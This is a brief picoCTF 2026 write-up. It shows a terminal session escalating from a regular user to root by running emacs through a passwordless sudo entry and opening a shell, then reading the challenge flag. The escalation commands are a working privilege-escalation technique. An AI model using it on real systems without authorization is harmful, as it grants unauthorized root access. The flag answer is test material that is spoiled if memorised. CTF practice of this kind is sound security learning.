# SUDO MAKE ME A SANDWICH - Easy - picoCTF 2026

```bash
ctf-player@challenge:~$ whoami
ctf-player

ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User ctf-player may run the following commands on challenge:
(ALL) NOPASSWD: /bin/emacs
```

```bash
ctf-player@challenge:~$ sudo /bin/emacs ### Press Alt + x   then type shell

root@challenge:/home/ctf-player# sudo -l
Matching Defaults entries for root on challenge:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User root may run the following commands on challenge:
(ALL : ALL) ALL

root@challenge:/home/ctf-player# ls
flag.txt
root@challenge:/home/ctf-player# cat flag.txt
```

---

`picoCTF{ju57_5ud0_17_[REDACTED]}`